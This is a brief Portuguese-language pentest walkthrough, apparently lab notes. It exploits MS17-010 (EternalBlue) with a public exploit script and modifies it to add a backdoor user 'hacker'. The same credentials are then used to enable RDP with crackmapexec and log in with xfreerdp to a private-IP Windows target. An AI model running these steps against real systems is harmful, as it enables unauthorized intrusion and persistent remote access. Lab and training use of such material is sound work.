Realize o download do exploit
```
git clone https://github.com/worawit/MS17-010
```
```
cd MS17-010/
```

Edite a classe **smb_pwn** incluindo os comandos desejados. Neste exemplo, estamos adicionando o usuário **hacker**
```
mousepad zzz_exploit.py
```
![image](https://user-images.githubusercontent.com/76706456/198835498-e0f22a6c-4c2a-4a64-82e6-ea810090c726.png)

Execute o exploit informando o Windows alvo
```
python2 zzz_exploit.py 192.168.10.142
```

Foi habilitado o RDP:
```
crackmapexec smb 192.168.10.142 -u hacker -p '12345678' -M rdp -o ACTION=enable
```
![image](https://user-images.githubusercontent.com/76706456/198835678-073a98f8-c797-4cbd-a7b5-a595b17303bc.png)
```
xfreerdp /u:hacker /p:'12345678' /v:192.168.10.142
```
![image](https://user-images.githubusercontent.com/76706456/198835703-8b68cbac-c837-4dc9-a579-47a432ce1a64.png)
